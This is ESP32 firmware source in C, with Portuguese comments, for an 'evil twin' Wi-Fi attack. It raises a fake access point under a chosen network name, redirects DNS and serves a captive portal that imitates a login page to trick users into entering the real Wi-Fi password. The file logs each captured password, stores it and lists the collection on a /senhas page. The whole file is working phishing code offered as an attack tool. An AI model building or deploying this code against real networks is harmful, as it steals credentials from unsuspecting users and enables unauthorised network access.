#include "evil_twin.h"
#include "dns_server.h"
#include "wifi_service.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include <string.h>
#include "http_server_service.h"

// =================================================================
// Definições e Variáveis Globais
// =================================================================
static const char *TAG_ET = "EVIL_TWIN_BACKEND";
#define MAX_PASSWORDS 20
#define MAX_PASSWORD_LEN 64

static char captured_passwords[MAX_PASSWORDS][MAX_PASSWORD_LEN];
static int password_count = 0;

// =================================================================
// HTML do Portal Cativo e Páginas
// =================================================================
static const char *captive_portal_html = "<!DOCTYPE html><html><head><title>Wi-Fi Login</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{font-family:Arial,sans-serif;text-align:center;background-color:#f0f0f0;}div{background:white;margin:50px auto;padding:20px;border-radius:10px;width:80%;max-width:400px;box-shadow:0 4px 8px rgba(0,0,0,0.1);}input[type=password]{width:90%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:5px;}input[type=submit]{background-color:#4CAF50;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;}</style></head><body><div><h2>Conecte-se a rede</h2><p>Por favor, insira a senha da rede para continuar.</p><form action='/submit' method='post'><input type='password' name='password' placeholder='Senha do Wi-Fi'><input type='submit' value='Conectar'></form></div></body></html>";
static const char *thank_you_html = "<!DOCTYPE html><html><head><title>Conectado</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{font-family:Arial,sans-serif;text-align:center;padding:50px;}</style></head><body><h1>Obrigado!</h1><p>Você está conectado a internet.</p></body></html>";

// =================================================================
// Handlers do Servidor HTTP
// =================================================================
static esp_err_t submit_post_handler(httpd_req_t *req) {
    char buf[100];
    int ret, remaining = req->content_len;
    if (remaining >= sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Request too long");
        return ESP_FAIL;
    }
    ret = httpd_req_recv(req, buf, remaining);
    if (ret <= 0) return ESP_FAIL;
    buf[ret] = '\0';

    char password[MAX_PASSWORD_LEN];
    if (httpd_query_key_value(buf, "password", password, sizeof(password)) == ESP_OK) {
        ESP_LOGI(TAG_ET, "Senha capturada: %s", password);
        if (password_count < MAX_PASSWORDS) {
            strncpy(captured_passwords[password_count], password, MAX_PASSWORD_LEN);
            captured_passwords[password_count][MAX_PASSWORD_LEN - 1] = '\0';
            password_count++;
        }
    }
    httpd_resp_send(req, thank_you_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t passwords_get_handler(httpd_req_t *req) {
    char *resp_str = (char*) malloc(4096);
    if (resp_str == NULL) return ESP_FAIL;
    strcpy(resp_str, "<html><body><h1>Senhas Capturadas</h1><ul>");
    for (int i = 0; i < password_count; i++) {
        char item[100];
        snprintf(item, sizeof(item), "<li>%s</li>", captured_passwords[i]);
        strcat(resp_str, item);
    }
    strcat(resp_str, "</ul></body></html>");
    httpd_resp_send(req, resp_str, strlen(resp_str));
    free(resp_str);
    return ESP_OK;
}

static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
    httpd_resp_send(req, captive_portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// =================================================================
// Lógica do Servidor
// =================================================================
static void register_evil_twin_handlers(void) {
    start_web_server();
    httpd_uri_t submit_uri = { .uri = "/submit", .method = HTTP_POST, .handler = submit_post_handler };
    http_server_register_uri(&submit_uri);
    httpd_uri_t passwords_uri = { .uri = "/senhas", .method = HTTP_GET, .handler = passwords_get_handler };
    http_server_register_uri(&passwords_uri);
    httpd_uri_t root_uri = { .uri = "/*", .method = HTTP_GET, .handler = captive_portal_get_handler };
    http_server_register_uri(&root_uri);
    
    httpd_uri_t captive_portal_uri = {
        .uri       = "/hotspot-detect.html", // O asterisco captura qualquer rota
        .method    = HTTP_GET,
        .handler   = captive_portal_get_handler,
        .user_ctx  = NULL
    };
    http_server_register_uri(&captive_portal_uri);
}

// =================================================================
// Funções Públicas (API do Backend)
// =================================================================
void evil_twin_start_attack(const char* ssid) {
    password_count = 0;
    ESP_LOGI(TAG_ET, "Iniciando lógica do Evil Twin para SSID: %s", ssid);
    wifi_change_to_hotspot(ssid);
    start_dns_server();
    vTaskDelay(pdMS_TO_TICKS(1000)); // Delay para o AP subir
    register_evil_twin_handlers();
    ESP_LOGI(TAG_ET, "Lógica do Evil Twin ativa.");
}

void evil_twin_stop_attack(void) {
    stop_http_server();
    wifi_service_init(); // Restaura o modo Wi-Fi padrão
    ESP_LOGI(TAG_ET, "Lógica do Evil Twin parada.");
}

